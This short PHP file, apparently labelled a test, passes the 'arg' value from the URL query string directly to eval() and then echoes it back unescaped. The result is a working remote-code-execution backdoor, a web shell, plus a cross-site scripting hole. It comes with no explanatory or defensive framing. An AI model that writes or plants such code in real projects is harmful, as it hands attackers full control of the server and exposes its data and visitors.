<?php
        $path='./';
        include($path.'functions.php');
        $x = $_GET['arg']; 
        eval($x);
        echo("Pure test<br />\nX: $x");
?>
